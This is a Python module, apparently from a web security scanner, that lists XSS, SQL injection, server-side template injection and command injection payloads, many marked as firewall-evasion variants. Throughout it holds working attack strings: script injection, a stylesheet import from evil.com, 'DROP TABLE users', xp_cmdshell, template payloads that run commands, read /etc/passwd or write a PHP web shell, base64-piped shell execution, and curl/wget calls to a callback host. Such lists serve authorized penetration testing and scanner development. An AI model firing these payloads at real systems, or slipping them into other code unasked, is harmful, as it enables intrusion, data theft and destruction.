"""
Injection Payloads - XSS, SQLi, SSTI, Command Injection with WAF Bypass
"""

# 16. XSS Payloads - from PayloadsAllTheThings
XSS_PAYLOADS = [
    # Basic payloads
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    # Encoded payloads
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
    # Event handlers
    "<input autofocus onfocus=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "<details/open/ontoggle=alert('XSS')>",
    "<video><source onerror=alert('XSS')>",
    # WAF bypass
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<script>eval('\\x61lert(1)')</script>",
    "<img src=x onerror='&#97;lert(1)'>",
    # SVG XSS
    "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>",
    # Data URI
    "data:text/html,<script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    # Polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
    
    # ============================================
    # WAF BYPASS VARIATIONS FOR XSS
    # ============================================
    
    # HTML Entity encoding
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    "&#x3c;script&#x3e;alert('XSS')&#x3c;/script&#x3e;",
    
    # Unicode encoding
    "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
    "<script>\\u0061lert('XSS')</script>",
    
    # Case manipulation
    "<SCRIPT>alert('XSS')</SCRIPT>",
    "<scRiPt>alert('XSS')</sCrIpT>",
    "<ScRiPt>alert('XSS')</ScRiPt>",
    
    # Null byte injection
    "<scri%00pt>alert('XSS')</scri%00pt>",
    "<script%00>alert('XSS')</script>",
    
    # Tab/newline bypass
    "<script\t>alert('XSS')</script>",
    "<script\n>alert('XSS')</script>",
    "<script\r>alert('XSS')</script>",
    "<img\tsrc=x\tonerror=alert('XSS')>",
    
    # Double encoding
    "%253Cscript%253Ealert('XSS')%253C/script%253E",
    
    # Comment bypass
    "<script>/**/alert('XSS')/**/</script>",
    "<script>/***/alert('XSS')/***/</script>",
    "<!--><script>alert('XSS')</script>",
    
    # Concatenation bypass
    "<script>al\\u0065rt('XSS')</script>",
    "<script>eval('ale'+'rt(1)')</script>",
    "<script>window['alert']('XSS')</script>",
    
    # No space bypass
    "<svg/onload=alert('XSS')>",
    "<img/src=x/onerror=alert('XSS')>",
    "<body/onload=alert('XSS')>",
    
    # Quote bypass
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert`1`>",
    "<script>alert(1)</script>",
    
    # Event handler variations
    "<svg onload=alert(1)>",
    "<body onpageshow=alert(1)>",
    "<math href=\"javascript:alert(1)\">click</math>",
    "<table background=\"javascript:alert(1)\">",
    
    # CSS injection
    "<style>@import'http://evil.com/xss.css';</style>",
    "<div style=\"background:url(javascript:alert(1))\">",
    
    # Object/embed bypass
    "<object data=\"javascript:alert(1)\">",
    "<embed src=\"javascript:alert(1)\">",
    
    # Angular bypass
    "{{constructor.constructor('alert(1)')()}}",
    "{{$on.constructor('alert(1)')()}}",
    
    # DOM clobbering
    "<form id=test><input id=test name=id>",
    "<img name=test src=x onerror=alert(1)>",
]

# 17. SQL Injection Payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1",
    "1' AND '1'='1",
    "1 AND 1=1",
    "1' UNION SELECT NULL--",
    "1' UNION SELECT 1,2,3--",
    "'; DROP TABLE users--",
    "1'; WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)--",
    "admin'--",
    "admin' #",
    "-1 OR 2+2=4--",
    "1 OR 1=1",
    "' UNION SELECT username, password FROM users--",
    
    # ============================================
    # WAF BYPASS VARIATIONS FOR SQLI
    # ============================================
    
    # Case manipulation
    "' oR '1'='1",
    "' Or '1'='1' --",
    "' OR '1'='1' --",
    "' or '1'='1' /*",
    
    # Comment variations
    "' OR '1'='1'/**/--",
    "' OR '1'='1'#",
    "' OR '1'='1';%00",
    "' OR/**/'1'='1'--",
    
    # URL encoding
    "%27%20OR%20%271%27%3D%271",
    "%27%20OR%20%271%27%3D%271%27%20--",
    
    # Double encoding
    "%2527%2520OR%2520%25271%2527%253D%25271",
    
    # Unicode encoding
    "' O\\u0052 '1'='1",
    "\\u0027 OR \\u00271\\u0027=\\u00271",
    
    # Hex encoding
    "' OR 0x31=0x31--",
    "' OR 1=0x1--",
    
    # Null byte
    "' OR '1'='1'%00--",
    "' OR '1'='1%00'--",
    
    # Space bypass
    "'/**/OR/**/'1'='1",
    "'%09OR%09'1'='1",
    "'%0aOR%0a'1'='1",
    "'%0dOR%0d'1'='1",
    "'%a0OR%a0'1'='1",
    
    # Inline comments
    "'/*!'OR'*/'1'='1",
    "' /*!50000OR*/ '1'='1",
    "' /*!OR*/ '1'='1",
    
    # Scientific notation
    "' OR 1e0=1e0--",
    "' OR 1.0=1.0--",
    
    # Buffer overflow bypass
    "' OR '1'='1" + "/*" * 100 + "*/--",
    
    # Alternative syntax
    "' || '1'='1",
    "' && '1'='1",
    "' OR NOT '1'='2",
    
    # LIKE bypass
    "' OR 'a' LIKE 'a",
    "' OR 1 LIKE 1--",
    
    # Time-based blind (WAF bypass)
    "' OR IF(1=1,SLEEP(5),0)--",
    "' OR BENCHMARK(10000000,SHA1('test'))--",
    "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    
    # Error-based (WAF bypass)
    "' OR extractvalue(1,concat(0x7e,(SELECT version())))--",
    "' OR updatexml(1,concat(0x7e,(SELECT version())),1)--",
    
    # Stacked queries
    "'; DECLARE @a VARCHAR(100)--",
    "'; EXEC xp_cmdshell 'id'--",
]

# 19. SSTI Payloads - Server-Side Template Injection
SSTI_PAYLOADS = [
    # Jinja2/Python
    "{{7*7}}",
    "{{config}}",
    "{{config.items()}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "${7*7}",
    # Twig
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    # Freemarker
    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    # Velocity
    "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))",
    # ERB
    "<%=7*7%>",
    "<%= system('id') %>",
    # Smarty
    "{php}echo `id`;{/php}",
    
    # ============================================
    # WAF BYPASS VARIATIONS FOR SSTI
    # ============================================
    
    # Jinja2 bypass variations
    "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}",
    "{{request['application']['__globals__']}}",
    "{{''['__class__']['__mro__'][2]['__subclasses__']()}}",
    "{%set a='__cla'+'ss__'%}{{''[a]}}",
    "{{().__class__.__bases__[0].__subclasses__()}}",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    
    # Unicode bypass
    "{{\\u0027\\u0027.__class__}}",
    "{{''[\"\\x5f\\x5fclass\\x5f\\x5f\"]}}",
    
    # Concatenation bypass
    "{{'a'.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
    "{{(lipsum|attr('\\x5f\\x5fglobals\\x5f\\x5f'))}}",
    
    # Filter bypass
    "{{''|attr('__class__')|attr('__mro__')}}",
    "{{request|attr(request.args.x)}}",  # ?x=__class__
    "{{lipsum.__globals__.os.popen('id').read()}}",
    
    # Twig bypass
    "{{['id']|filter('system')}}",
    "{{['cat /etc/passwd']|filter('exec')}}",
    "{{app.request.server.get('DOCUMENT_ROOT')}}",
    
    # Freemarker bypass
    "<#assign cmd = \"freemarker.template.utility.Execute\"?new()>${cmd(\"id\")}",
    "${.data_model.class.protectionDomain.codeSource.location}",
    
    # Velocity bypass
    "#set($e=\"e\")$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"id\")",
    
    # ERB bypass
    "<%= `id` %>",
    "<%= IO.popen('id').readlines() %>",
    "<%= File.read('/etc/passwd') %>",
    
    # Smarty bypass
    "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
    "{literal}{/literal}{if system('id')}{/if}",
    
    # Pebble bypass
    "{% set cmd = 'id' %}{{ cmd.class.forName('java.lang.Runtime').getRuntime().exec(cmd).inputStream.text }}",
    
    # Mako bypass
    "${self.module.cache.util.os.popen('id').read()}",
    "<%import os;x=os.popen('id').read()%>${x}",
    
    # Thymeleaf bypass
    "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x",
    "${#rt=@java.lang.Runtime@getRuntime().exec('id')}",
    
    # Handlebars bypass
    "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').exec('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
]

# 20. Command Injection Payloads
CMD_INJECTION_PAYLOADS = [
    "; id",
    "| id",
    "|| id",
    "& id",
    "&& id",
    "`id`",
    "$(id)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; whoami",
    "| whoami",
    "; uname -a",
    "| uname -a",
    # Windows
    "& dir",
    "| dir",
    "& type C:\\windows\\win.ini",
    # Blind
    "; sleep 5",
    "| sleep 5",
    "; ping -c 5 {callback}",
    "| ping -c 5 {callback}",
    "`nslookup {callback}`",
    "$(nslookup {callback})",
    
    # ============================================
    # WAF BYPASS VARIATIONS FOR CMD INJECTION
    # ============================================
    
    # Encoding variations
    ";%20id",
    "|%20id",
    "%3B%20id",  # ; id
    "%7C%20id",  # | id
    "%26%20id",  # & id
    
    # Double encoding
    "%253B%2520id",
    "%257C%2520id",
    
    # Newline injection
    "%0aid",
    "%0did",
    "%0a%0did",
    "\nid",
    "\rid",
    
    # Tab injection
    ";\tid",
    "|\tid",
    
    # Unicode bypass
    ";\\u0069\\u0064",  # ;id
    "|\\x69\\x64",  # |id
    
    # Variable injection
    ";$IFS$9id",
    ";${IFS}id",
    "|$IFS$9cat$IFS/etc/passwd",
    
    # Brace expansion
    ";{id,}",
    ";{cat,/etc/passwd}",
    
    # Quote bypass
    ";'i'd",
    ";\"i\"d",
    ";i'd'",
    ";i\"d\"",
    
    # Backslash bypass
    ";i\\d",
    ";ca\\t /etc/passwd",
    
    # Wildcard bypass
    ";/b?n/ca? /etc/passwd",
    ";/bin/c?t /etc/passwd",
    ";/???/??t /etc/passwd",
    
    # Base64 bypass
    ";echo aWQ= | base64 -d | sh",
    ";echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh",
    
    # Hex bypass
    ";echo 6964 | xxd -r -p | sh",
    
    # Rev bypass
    ";$(rev<<<'di')",
    ";$(echo 'di' | rev)",
    
    # Time-based blind
    ";sleep${IFS}5",
    "|sleep${IFS}5",
    ";ping${IFS}-c${IFS}5${IFS}127.0.0.1",
    
    # Out-of-band
    ";curl${IFS}{callback}",
    ";wget${IFS}{callback}",
    ";nslookup${IFS}{callback}",
    ";dig${IFS}{callback}",
    
    # Environment variable
    ";env",
    ";printenv",
    ";set",
    
    # Windows CMD bypass
    "&c^md /c dir",
    "&cm%64 /c dir",
    "&^c^m^d /c whoami",
    
    # PowerShell bypass
    "&powershell -c \"id\"",
    "&powershell -enc aWQ=",
    "&pwsh -c \"id\"",
    
    # Path injection
    ";/usr/bin/id",
    ";/bin/id",
    "|/bin/cat /etc/passwd",
]
